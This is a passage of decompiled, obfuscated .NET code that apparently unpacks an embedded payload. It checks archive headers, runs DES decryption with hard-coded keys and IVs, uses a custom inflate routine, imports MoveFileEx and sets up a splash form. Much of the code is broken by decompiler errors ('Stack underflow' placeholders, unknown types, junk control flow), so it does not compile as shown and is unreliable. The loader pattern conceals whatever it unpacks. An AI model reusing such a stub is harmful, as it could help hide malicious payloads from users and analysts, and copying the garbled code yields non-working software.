				*(int*)((byte*)ptr + 4) = _0006._0001(obj);
				*(int*)((byte*)ptr + 8) = _0006._0001(obj);
				if (*(int*)ptr != 67324752 || *(short*)((byte*)ptr + 44) != 20 || *(int*)((byte*)ptr + 4) != 0 || *(int*)((byte*)ptr + 8) != 8)
				{
					throw new FormatException("Wrong Header Signature");
				}
				num = _0006._0001(obj);
				if (2 == 0)
				{
					goto IL_0226;
				}
				_0006._0001(obj);
				_0006._0001(obj);
				*(int*)((byte*)ptr + 12) = _0006._0001(obj);
				*(int*)((byte*)ptr + 16) = _0006._0001(obj);
				*(int*)((byte*)ptr + 20) = _0006._0001(obj);
				if (*(int*)((byte*)ptr + 16) > 0)
				{
					byte[] buffer = new byte[*(int*)((byte*)ptr + 16)];
					obj.Read(buffer, 0, *(int*)((byte*)ptr + 16));
				}
				if (*(int*)((byte*)ptr + 20) > 0)
				{
					byte[] buffer2 = new byte[*(int*)((byte*)ptr + 20)];
					if (-1 == 0)
					{
						goto IL_02bc;
					}
					obj.Read(buffer2, 0, *(int*)((byte*)ptr + 20));
				}
			}
			else
			{
				*(int*)((byte*)ptr + 24) = *(int*)ptr >> 24;
				*(int*)ptr -= *(int*)((byte*)ptr + 24) << 24;
				if (*(int*)ptr != 8223355)
				{
					throw new FormatException("Unknown Header");
				}
				if (*(int*)((byte*)ptr + 24) != 1)
				{
					goto IL_0243;
				}
				if (0 == 0)
				{
					*(int*)((byte*)ptr + 28) = _0006._0001(obj);
					array = new byte[*(int*)((byte*)ptr + 28)];
					*(int*)((byte*)ptr + 32) = 0;
					goto IL_0237;
				}
			}
			byte[] array2 = new byte[obj.Length - obj.Position];
			obj.Read(array2, 0, array2.Length);
			global::_0003._0004._0001 obj2 = new global::_0003._0004._0001(array2);
			array = new byte[*(int*)((byte*)ptr + 12)];
			global::_0003._0004._0001 obj3 = obj2;
			byte[] array3 = array;
			*(int*)((byte*)ptr + 40) = array.Length;
			_0006._0001(*(int*)((byte*)ptr + 40), 0, array3, obj3);
			array2 = null;
			goto IL_030a;
			IL_0243:
			if (*(int*)((byte*)ptr + 24) == 2)
			{
				byte[] array4 = new byte[8] { 164, 215, 195, 131, 88, 187, 35, 93 };
				byte[] array5 = new byte[8] { 215, 64, 28, 129, 102, 219, 136, 239 };
				using ICryptoTransform cryptoTransform = _0006._0001(true, array4, array5);
				array = _0006._0001(cryptoTransform.TransformFinalBlock(P_0, 4, P_0.Length - 4));
			}
			byte[] array6 = default(byte[]);
			if (*(int*)((byte*)ptr + 24) == 3)
			{
				array6 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				goto IL_02bc;
			}
			goto IL_030a;
			IL_02bc:
			byte[] array7 = new byte[16]
			{
				2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
				2, 2, 2, 2, 2, 2
			};
			using (ICryptoTransform cryptoTransform2 = _0006._0001(true, array6, array7))
			{
				array = _0006._0001(cryptoTransform2.TransformFinalBlock(P_0, 4, P_0.Length - 4));
			}
			goto IL_030a;
			IL_0226:
			*(int*)((byte*)ptr + 32) += *(int*)((byte*)ptr + 36);
			goto IL_0237;
			IL_0237:
			if (*(int*)((byte*)ptr + 32) < *(int*)((byte*)ptr + 28))
			{
				int num2 = _0006._0001(obj);
				*(int*)((byte*)ptr + 36) = _0006._0001(obj);
				byte[] array8 = new byte[num2];
				obj.Read(array8, 0, array8.Length);
				num = _0006._0001(*(int*)((byte*)ptr + 36), *(int*)((byte*)ptr + 32), array, new global::_0003._0004._0001(array8));
				goto IL_0226;
			}
			goto IL_0243;
			IL_030a:
			obj.Close();
			obj = null;
			return array;
		}

		static bool _0001(global::_0003._0004._0002 P_0)
		{
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 2
			_ = ((global::_0003._0004._0002)/*Error near IL_0007: Stack underflow*/)._0001;
			int num = ((global::_0003._0004._0002)/*Error near IL_000e: Stack underflow*/)._0002;
			return (int)/*Error near IL_0010: Stack underflow*/ == num;
		}

		static ICryptoTransform _0001(bool P_0, byte[] P_1, byte[] P_2)
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			new DESCryptoServiceProvider();
			DESCryptoServiceProvider dESCryptoServiceProvider = (DESCryptoServiceProvider)/*Error near IL_0061: Stack underflow*/;
			try
			{
				ICryptoTransform result;
				while (true)
				{
					if (0 == 0 && (int)/*Error near IL_000e: Stack underflow*/ == 0)
					{
						if (false)
						{
							continue;
						}
						((SymmetricAlgorithm)/*Error near IL_003c: Stack underflow*/).CreateEncryptor((byte[])/*Error near IL_003c: Stack underflow*/, (byte[]?)/*Error near IL_003c: Stack underflow*/);
						goto IL_0025;
					}
					goto IL_001f;
					IL_0025:
					result = (ICryptoTransform)/*Error near IL_0026: Stack underflow*/;
					if (3 == 0)
					{
						goto IL_001f;
					}
					break;
					IL_001f:
					((SymmetricAlgorithm)/*Error near IL_0025: Stack underflow*/).CreateDecryptor((byte[])/*Error near IL_0025: Stack underflow*/, P_2);
					goto IL_0025;
				}
				return result;
			}
			finally
			{
				if (6u != 0 && dESCryptoServiceProvider != null && 0 == 0)
				{
					((IDisposable)dESCryptoServiceProvider).Dispose();
				}
			}
		}

		static void _0001()
		{
			try
			{
				_0004._0001();
			}
			catch (Exception)
			{
			}
		}

		static bool _0001(Assembly P_0, Assembly P_1)
		{
			return true;
		}

		static void _0001(_0002 P_0)
		{
			//IL_0047: Unknown result type (might be due to invalid IL or missing references)
			//IL_0051: Expected O, but got Unknown
			//IL_00e0: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ea: Expected O, but got Unknown
			//IL_0442: Incompatible stack heights: 0 vs 1
			//IL_044c: Incompatible stack heights: 0 vs 1
			//IL_0452: Incompatible stack heights: 0 vs 1
			//IL_0458: Incompatible stack heights: 0 vs 1
			//IL_045d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0462: Incompatible stack heights: 0 vs 1
			//IL_0468: Incompatible stack heights: 0 vs 1
			//IL_046d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0472: Incompatible stack heights: 0 vs 1
			//IL_0478: Incompatible stack heights: 0 vs 1
			//IL_047d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0482: Incompatible stack heights: 0 vs 1
			new Container();
			((_0002)/*Error near IL_000f: Stack underflow*/)._0001 = (IContainer)/*Error near IL_000f: Stack underflow*/;
			new Timer(((_0002)/*Error near IL_001e: Stack underflow*/)._0001);
			((_0002)/*Error near IL_0028: Stack underflow*/)._0001 = (Timer)/*Error near IL_0028: Stack underflow*/;
			new Label();
			((_0002)/*Error near IL_0037: Stack underflow*/)._0001 = (Label)/*Error near IL_0037: Stack underflow*/;
			new PictureBox();
			((_0002)/*Error near IL_0046: Stack underflow*/)._0002 = (PictureBox)/*Error near IL_0046: Stack underflow*/;
			P_0._0001 = new PictureBox();
			global::_0002._007E_0004(P_0._0002);
			global::_0002._007E_0004(P_0._0001);
			global::_0002._0005(P_0);
			_0089._007E_009D(P_0._0001, 3000);
			_008A._007E_0001_0002(P_0._0001, P_0._0001);
			_0019._007E_0084(P_0._0001, true);
			_008B._007E_0003_0002(P_0._0001, new Font(_009B(107396342), 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
			_008C._007E_0004_0002(P_0._0001, new Point(50, 291));
			_008D._007E_0005_0002(P_0._0001, _009B(107396313));
			_008E._007E_0007_0002(P_0._0001, new Size(159, 16));
			_0089._007E_009E(P_0._0001, 3);
			_008D._007E_0006_0002(P_0._0001, _009B(107396304));
			_008F._007E_000E_0002(P_0._0002, (Image)(object)_0006._0001());
			_008C._007E_0004_0002(P_0._0002, new Point(99, 225));
			_008D._007E_0005_0002(P_0._0002, _009B(107396275));
			_008E._007E_0007_0002(P_0._0002, new Size(64, 64));
			_0090._007E_000F_0002(P_0._0002, (PictureBoxSizeMode)2);
			_0089._007E_009F(P_0._0002, 4);
			_0019._007E_0086(P_0._0002, false);
			_008F._007E_000E_0002(P_0._0001, (Image)(object)_0006._0001());
			_008C._007E_0004_0002(P_0._0001, new Point(12, 12));
			_008D._007E_0005_0002(P_0._0001, _009B(107396290));
			_008E._007E_0007_0002(P_0._0001, new Size(239, 209));
			_0090._007E_000F_0002(P_0._0001, (PictureBoxSizeMode)2);
			_0089._007E_009F(P_0._0001, 2);
			_0019._007E_0086(P_0._0001, false);
			_0091._0010_0002(P_0, new SizeF(6f, 13f));
			_0092._0011_0002(P_0, (AutoScaleMode)1);
			_0094._007E_0013_0002(P_0, _0093._0012_0002());
			_008E._0008_0002(P_0, new Size(266, 312));
			_0019._0087(P_0, false);
			_0096._007E_0015_0002(_0095._0014_0002(P_0), (Control)(object)P_0._0002);
			_0096._007E_0015_0002(_0095._0014_0002(P_0), (Control)(object)P_0._0001);
			_0096._007E_0015_0002(_0095._0014_0002(P_0), (Control)(object)P_0._0001);
			_0097._0016_0002(P_0, (FormBorderStyle)2);
			_0019._0088(P_0, false);
			_0019._0089(P_0, false);
			_008D._0005_0002(P_0, _009B(107396241));
			_0019._008A(P_0, false);
			_0019._008B(P_0, false);
			_0098._0017_0002(P_0, (SizeGripStyle)1);
			_0099._0018_0002(P_0, (FormStartPosition)1);
			_008D._007E_0006_0002(P_0, _009B(107396264));
			_0019._008C(P_0, true);
			_008A._0002_0002(P_0, P_0._0002);
			global::_0002._007E_0006(P_0._0002);
			global::_0002._007E_0006(P_0._0001);
			_0019._008D(P_0, false);
			global::_0002._0007(P_0);
		}

		static string _0001(int P_0)
		{
			//IL_0038: Incompatible stack heights: 0 vs 2
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_006a: Incompatible stack heights: 0 vs 2
			//IL_007a: Incompatible stack heights: 0 vs 1
			object obj = global::_0006._0002._0001;
			_ = _009A._0019_0002;
			/*Error near IL_0074: Stack underflow*/((object)/*Error near IL_0074: Stack underflow*/);
			try
			{
				_ = global::_0006._0002._0001;
				((Dictionary<int, string>)/*Error near IL_003f: Stack underflow*/).TryGetValue((int)/*Error near IL_003f: Stack underflow*/, out string _);
				string result = default(string);
				while ((int)/*Error near IL_0026: Stack underflow*/ != 0)
				{
					if (false)
					{
						continue;
					}
					if (7u != 0)
					{
						if (0 == 0)
						{
							return (string)/*Error near IL_0047: Stack underflow*/;
						}
						return result;
					}
					return result;
				}
			}
			finally
			{
				do
				{
					_009A._001A_0002(obj);
				}
				while (false);
			}
			return _0006._0001((int)/*Error near IL_0060: Stack underflow*/);
		}

		static short _0001(int P_0)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_002d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0037: Unknown result type (might be due to invalid IL or missing references)
			//IL_0039: Unknown result type (might be due to invalid IL or missing references)
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0040: Incompatible stack heights: 0 vs 3
			//IL_0043: Incompatible stack heights: 0 vs 3
			//IL_0046: Incompatible stack heights: 0 vs 3
			_ = global::_0003._0004._0006._0001;
			_003F val = /*Error near IL_000a: Stack underflow*/& 0xF;
			_ = ((byte[])/*Error near IL_000b: Stack underflow*/)[val] << 12;
			_ = global::_0003._0004._0006._0001;
			_003F val2 = /*Error near IL_0017: Stack underflow*/>> 4;
			byte num = ((byte[])/*Error near IL_001b: Stack underflow*/)[val2 & 0xF];
			_ = /*Error near IL_001e: Stack underflow*/| (num << 8);
			_ = global::_0003._0004._0006._0001;
			_003F val3 = /*Error near IL_0027: Stack underflow*/>> 8;
			byte num2 = ((byte[])/*Error near IL_002b: Stack underflow*/)[val3 & 0xF];
			_ = /*Error near IL_002e: Stack underflow*/| (num2 << 4);
			_ = global::_0003._0004._0006._0001;
			_003F val4 = /*Error near IL_0038: Stack underflow*/>> 12;
			byte num3 = ((byte[])/*Error near IL_0039: Stack underflow*/)[val4];
			return (short)(/*Error near IL_003a: Stack underflow*/ | num3);
		}

		unsafe static int _0001(global::_0003._0004._0003 P_0, global::_0003._0004._0002 P_1, int P_2)
		{
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0040: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d2: Incompatible stack heights: 0 vs 1
			//IL_00d8: Incompatible stack heights: 0 vs 2
			//IL_00e2: Incompatible stack heights: 0 vs 1
			//IL_00e8: Incompatible stack heights: 0 vs 1
			//IL_00f2: Incompatible stack heights: 0 vs 1
			//IL_00fc: Incompatible stack heights: 0 vs 1
			//IL_0109: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[8];
			int num = 32768;
			if (num != 0)
			{
				int num2 = ((global::_0003._0004._0003)/*Error near IL_0020: Stack underflow*/)._0002;
				num = /*Error near IL_0021: Stack underflow*/- num2;
			}
			Math.Min((int)/*Error near IL_00e2: Stack underflow*/, num);
			_0006._0001((global::_0003._0004._0002)/*Error near IL_00f2: Stack underflow*/);
			Math.Min((int)/*Error near IL_00fc: Stack underflow*/, (int)/*Error near IL_00fc: Stack underflow*/);
			P_2 = (int)/*Error near IL_0103: Stack underflow*/;
			*(int*)(nint)(/*Error near IL_0041: Stack underflow*/ + 4) = 32768 - P_0._0001;
			if (P_2 > *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr = _0006._0001(P_1, P_0._0001, P_0._0001, *(int*)((byte*)ptr + 4));
				if (*(int*)ptr == *(int*)((byte*)ptr + 4))
				{
					*(int*)ptr += _0006._0001(P_1, P_0._0001, 0, P_2 - *(int*)((byte*)ptr + 4));
				}
			}
			else
			{
				*(int*)ptr = _0006._0001(P_1, P_0._0001, P_0._0001, P_2);
			}
			P_0._0001 = (P_0._0001 + *(int*)ptr) & 0x7FFF;
			P_0._0002 += *(int*)ptr;
			return *(int*)ptr;
		}

		static void _0001(global::_0003._0004._0002 P_0)
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected I4, but got Unknown
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 2
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			_ = ((global::_0003._0004._0002)/*Error near IL_0009: Stack underflow*/)._0001;
			int num = ((global::_0003._0004._0002)/*Error near IL_0010: Stack underflow*/)._0003;
			_003F val = /*Error near IL_0016: Stack underflow*/>> (num & 7);
			((global::_0003._0004._0002)/*Error near IL_001b: Stack underflow*/)._0001 = (uint)(int)val;
			int num2 = ((global::_0003._0004._0002)/*Error near IL_0024: Stack underflow*/)._0003;
			((global::_0003._0004._0002)/*Error near IL_002c: Stack underflow*/)._0003 = num2 & -8;
		}

		unsafe static void _0001(global::_0003._0004._0004 P_0, byte[] P_1)
		{
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_0035: Unknown result type (might be due to invalid IL or missing references)
			//IL_0042: Unknown result type (might be due to invalid IL or missing references)
			//IL_004d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0312: Incompatible stack heights: 0 vs 1
			//IL_0318: Incompatible stack heights: 0 vs 1
			//IL_031e: Incompatible stack heights: 0 vs 2
			//IL_0324: Incompatible stack heights: 0 vs 1
			//IL_032a: Incompatible stack heights: 0 vs 1
			//IL_0330: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[64];
			int[] array = new int[16];
			int[] array2 = new int[16];
			*(int*)(nint)(/*Error near IL_002a: Stack underflow*/ + 12) = 0;
			while (*(int*)((byte*)ptr + 12) < P_1.Length)
			{
				_ = /*Error near IL_0036: Stack underflow*/+ 16;
				int num = *(int*)(nint)(/*Error near IL_0043: Stack underflow*/ + 12);
				byte num2 = ((byte[])/*Error near IL_0045: Stack underflow*/)[num];
				*(int*)(nint)/*Error near IL_0046: Stack underflow*/ = num2;
				if (*(int*)(nint)(/*Error near IL_004e: Stack underflow*/ + 16) > 0)
				{
					int num3 = *(int*)((byte*)ptr + 16);
					((int[])/*Error near IL_005d: Stack underflow*/)[num3]++;
				}
				(*(int*)((byte*)ptr + 12))++;
			}
			*(int*)ptr = 0;
			*(int*)((byte*)ptr + 4) = 512;
			*(int*)((byte*)ptr + 20) = 1;
			while (*(int*)((byte*)ptr + 20) <= 15)
			{
				array2[*(int*)((byte*)ptr + 20)] = *(int*)ptr;
				*(int*)ptr += array[*(int*)((byte*)ptr + 20)] << 16 - *(int*)((byte*)ptr + 20);
				if (*(int*)((byte*)ptr + 20) >= 10)
				{
					*(int*)((byte*)ptr + 24) = array2[*(int*)((byte*)ptr + 20)] & 0x1FF80;
					*(int*)((byte*)ptr + 28) = *(int*)ptr & 0x1FF80;
					*(int*)((byte*)ptr + 4) += *(int*)((byte*)ptr + 28) - *(int*)((byte*)ptr + 24) >> 16 - *(int*)((byte*)ptr + 20);
				}
				(*(int*)((byte*)ptr + 20))++;
			}
			P_0._0001 = new short[*(int*)((byte*)ptr + 4)];
			*(int*)((byte*)ptr + 8) = 512;
			*(int*)((byte*)ptr + 32) = 15;
			while (*(int*)((byte*)ptr + 32) >= 10)
			{
				*(int*)((byte*)ptr + 36) = *(int*)ptr & 0x1FF80;
				*(int*)ptr -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
				*(int*)((byte*)ptr + 40) = *(int*)ptr & 0x1FF80;
				while (*(int*)((byte*)ptr + 40) < *(int*)((byte*)ptr + 36))
				{
					P_0._0001[_0006._0001(*(int*)((byte*)ptr + 40))] = (short)((-(*(int*)((byte*)ptr + 8)) << 4) | *(int*)((byte*)ptr + 32));
					*(int*)((byte*)ptr + 8) += 1 << *(int*)((byte*)ptr + 32) - 9;
					*(int*)((byte*)ptr + 40) += 128;
				}
				(*(int*)((byte*)ptr + 32))--;
			}
			*(int*)((byte*)ptr + 44) = 0;
			while (*(int*)((byte*)ptr + 44) < P_1.Length)
			{
				*(int*)((byte*)ptr + 48) = P_1[*(int*)((byte*)ptr + 44)];
				if (*(int*)((byte*)ptr + 48) != 0)
				{
					*(int*)ptr = array2[*(int*)((byte*)ptr + 48)];
					do
					{
						*(int*)((byte*)ptr + 52) = _0006._0001(*(int*)ptr);
						if (*(int*)((byte*)ptr + 48) <= 9)
						{
							do
							{
								P_0._0001[*(int*)((byte*)ptr + 52)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
								*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
							}
							while (*(int*)((byte*)ptr + 52) < 512);
							continue;
						}
						*(int*)((byte*)ptr + 56) = P_0._0001[*(int*)((byte*)ptr + 52) & 0x1FF];
						*(int*)((byte*)ptr + 60) = 1 << (*(int*)((byte*)ptr + 56) & 0xF);
						*(int*)((byte*)ptr + 56) = -(*(int*)((byte*)ptr + 56) >> 4);
						do
						{
							P_0._0001[*(int*)((byte*)ptr + 56) | (*(int*)((byte*)ptr + 52) >> 9)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
							*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
						}
						while (*(int*)((byte*)ptr + 52) < *(int*)((byte*)ptr + 60));
					}
					while (false);
					array2[*(int*)((byte*)ptr + 48)] = *(int*)ptr + (1 << 16 - *(int*)((byte*)ptr + 48));
				}
				(*(int*)((byte*)ptr + 44))++;
			}
		}

		static void _0001(global::_0003._0004._0002 P_0, int P_1)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Expected I4, but got Unknown
			//IL_0022: Unknown result type (might be due to invalid IL or missing references)
			//IL_0028: Expected I4, but got Unknown
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 2
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 2
			while (true)
			{
				_ = ((global::_0003._0004._0002)/*Error near IL_0009: Stack underflow*/)._0001;
				_003F val = /*Error near IL_000e: Stack underflow*/& 0x1F;
				_003F val2 = /*Error near IL_000f: Stack underflow*/>> (int)val;
				((global::_0003._0004._0002)/*Error near IL_0014: Stack underflow*/)._0001 = (uint)(int)val2;
				while (0 == 0)
				{
					_ = ((global::_0003._0004._0002)/*Error near IL_0020: Stack underflow*/)._0003;
					_003F val3 = /*Error near IL_0023: Stack underflow*/- /*Error near IL_0023: Stack underflow*/;
					((global::_0003._0004._0002)/*Error near IL_0028: Stack underflow*/)._0003 = (int)val3;
					if (8u != 0)
					{
						return;
					}
				}
			}
		}

		unsafe static int _0001(global::_0003._0004._0004 P_0, global::_0003._0004._0002 P_1)
		{
			//IL_0048: Unknown result type (might be due to invalid IL or missing references)
			//IL_0054: Incompatible stack heights: 1 vs 0
			//IL_0121: Incompatible stack heights: 0 vs 1
			//IL_0127: Incompatible stack heights: 0 vs 1
			//IL_012d: Incompatible stack heights: 0 vs 2
			//IL_0133: Incompatible stack heights: 0 vs 1
			//IL_0139: Incompatible stack heights: 0 vs 1
			//IL_0143: Expected I4, but got Unknown
			//IL_0149: Incompatible stack heights: 0 vs 1
			//IL_014f: Incompatible stack heights: 0 vs 1
			void* ptr;
			int num;
			int num2;
			if (0 == 0)
			{
				while (true)
				{
					ptr = stackalloc byte[16];
					if ((num = _0006._0001((global::_0003._0004._0002)/*Error near IL_001c: Stack underflow*/, 9)) < 0)
					{
						break;
					}
					_ = ((global::_0003._0004._0004)/*Error near IL_002e: Stack underflow*/)._0001;
					if ((num2 = ((short[])/*Error near IL_0034: Stack underflow*/)[/*Error near IL_0034: Stack underflow*/]) >= 0)
					{
						if (0 == 0)
						{
							_003F val = /*Error near IL_0049: Stack underflow*/& 0xF;
							_0006._0001((global::_0003._0004._0002)/*Error near IL_0143: Stack underflow*/, (int)val);
							if (0 == 0)
							{
								return 16 >> 4;
							}
							continue;
						}
						goto IL_00bb;
					}
					goto IL_005e;
				}
				*(int*)((byte*)ptr + 12) = P_1._0003;
				num = _0006._0001(P_1, *(int*)((byte*)ptr + 12));
				goto IL_00f2;
			}
			goto IL_00fb;
			IL_005e:
			*(int*)(nint)/*Error near IL_0063: Stack underflow*/ = -(num2 >> 4);
			*(int*)((byte*)ptr + 4) = num2 & 0xF;
			if ((num = _0006._0001(P_1, *(int*)((byte*)ptr + 4))) >= 0)
			{
				num2 = P_0._0001[*(int*)ptr | (num >> 9)];
				_0006._0001(P_1, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)((byte*)ptr + 8) = P_1._0003;
			num = _0006._0001(P_1, *(int*)((byte*)ptr + 8));
			num2 = P_0._0001[*(int*)ptr | (num >> 9)];
			goto IL_00bb;
			IL_00bb:
			if (4u != 0)
			{
				if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
				{
					_0006._0001(P_1, num2 & 0xF);
					if (0 == 0)
					{
						return num2 >> 4;
					}
					goto IL_00f2;
				}
				return -1;
			}
			goto IL_00ff;
			IL_0118:
			return -1;
			IL_00f2:
			num2 = P_0._0001[num];
			goto IL_00fb;
			IL_00ff:
			if ((num2 & 0xF) <= *(int*)((byte*)ptr + 12))
			{
				_0006._0001(P_1, num2 & 0xF);
				return num2 >> 4;
			}
			goto IL_0118;
			IL_00fb:
			if (num2 >= 0)
			{
				goto IL_00ff;
			}
			goto IL_0118;
		}

		static void _0001()
		{
			try
			{
				_0006._0001();
			}
			catch (Exception)
			{
			}
		}

		[DllImport("kernel32", EntryPoint = "MoveFileEx")]
		static extern bool _0001(string _0002, string _0003, int _0004);

		static int _0001(global::_0003._0004._0002 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0003._0004._0002)/*Error near IL_0007: Stack underflow*/)._0003;
		}

		static int _0001(global::_0003._0004._0007 P_0)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_000c: Expected I4, but got Unknown
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			((Stream)/*Error near IL_0014: Stack underflow*/).ReadByte();
			((Stream)/*Error near IL_001e: Stack underflow*/).ReadByte();
			_003F val = /*Error near IL_000a: Stack underflow*/<< 8;
			return /*Error near IL_000b: Stack underflow*/| val;
		}

		static void _0001(int P_0, string P_1)
		{
			//IL_0027: Incompatible stack heights: 0 vs 2
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 2
			try
			{
				object obj;
				do
				{
					obj = global::_0006._0002._0001;
				}
				while (false);
				_ = _009A._0019_0002;
				/*Error near IL_004f: Stack underflow*/((object)/*Error near IL_004f: Stack underflow*/);
				try
				{
					do
					{
						if (4u != 0)
						{
							_ = global::_0006._0002._0001;
							((Dictionary<int, string>)/*Error near IL_0031: Stack underflow*/).Add((int)/*Error near IL_0031: Stack underflow*/, (string)/*Error near IL_0031: Stack underflow*/);
						}
					}
					while (false);
				}
				finally
				{
					if (0 == 0)
					{
						_009A._001A_0002(obj);
					}
				}
			}
			catch
			{
			}
		}

		static int _0001(global::_0003._0004._0002 P_0)
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0024: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected I4, but got Unknown
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 2
			int num = ((global::_0003._0004._0002)/*Error near IL_0007: Stack underflow*/)._0002;
			int num2;
			while (true)
			{
				num2 = ((global::_0003._0004._0002)/*Error near IL_000e: Stack underflow*/)._0001;
				if (false)
				{
					break;
				}
				num = /*Error near IL_0012: Stack underflow*/- num2;
				if (false)
				{
					continue;
				}
				num2 = ((global::_0003._0004._0002)/*Error near IL_001c: Stack underflow*/)._0003;
				break;
			}
			do
			{
				if (0 == 0)
				{
					num2 >>= 3;
				}
			}
			while (false);
			return /*Error near IL_0025: Stack underflow*/+ num2;
		}

		static Bitmap _0001()
		{
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Expected O, but got Unknown
			//IL_0025: Incompatible stack heights: 0 vs 2
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			_ = _0084._007E_0099;
			_0006._0001();
			_009B(107396215);
			CultureInfo cultureInfo = _0001._0001;
			/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, (string)/*Error near IL_0033: Stack underflow*/, cultureInfo);
			return (Bitmap)/*Error near IL_001b: Stack underflow*/;
		}

		unsafe static int _0001(int P_0, int P_1, byte[] P_2, global::_0003._0004._0001 P_3)
		{
			//IL_0024: Unknown result type (might be due to invalid IL or missing references)
			//IL_0087: Incompatible stack heights: 0 vs 1
			//IL_008d: Incompatible stack heights: 0 vs 1
			//IL_0093: Incompatible stack heights: 0 vs 1
			//IL_0099: Incompatible stack heights: 0 vs 2
			//IL_009f: Incompatible stack heights: 0 vs 1
			//IL_00a5: Incompatible stack heights: 0 vs 2
			//IL_00ab: Incompatible stack heights: 0 vs 1
			//IL_00b5: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[8];
			*(int*)(nint)/*Error near IL_000d: Stack underflow*/ = 0;
			int num;
			int num2;
			do
			{
				IL_0012:
				num = ((global::_0003._0004._0001)/*Error near IL_0017: Stack underflow*/)._0001;
				num2 = 11;
				if (num2 == 0)
				{
					continue;
				}
				if (num != num2)
				{
					_ = /*Error near IL_0025: Stack underflow*/+ 4;
					_ = ((global::_0003._0004._0001)/*Error near IL_0034: Stack underflow*/)._0001;
					_0006._0001((byte[])/*Error near IL_00b5: Stack underflow*/, (global::_0003._0004._0003)/*Error near IL_00b5: Stack underflow*/, (int)/*Error near IL_00b5: Stack underflow*/, (int)/*Error near IL_00b5: Stack underflow*/);
					*(_003F*)(nint)/*Error near IL_003b: Stack underflow*/ = /*Error near IL_003b: Stack underflow*/;
					P_1 += *(int*)((byte*)ptr + 4);
					*(int*)ptr += *(int*)((byte*)ptr + 4);
					P_0 -= *(int*)((byte*)ptr + 4);
					if (P_0 == 0)
					{
						return *(int*)ptr;
					}
				}
				if (_0006._0001(P_3))
				{
					goto IL_0012;
				}
				num = P_3._0001._0002;
				num2 = 0;
			}
			while (num > num2 && P_3._0001 != 11);
			return *(int*)ptr;
		}

		unsafe static bool _0001(global::_0003._0004._0001 P_0)
		{
			//IL_0211: Incompatible stack heights: 0 vs 1
			//IL_021b: Incompatible stack heights: 0 vs 1
			//IL_0227: Incompatible stack heights: 0 vs 1
			//IL_022d: Incompatible stack heights: 0 vs 1
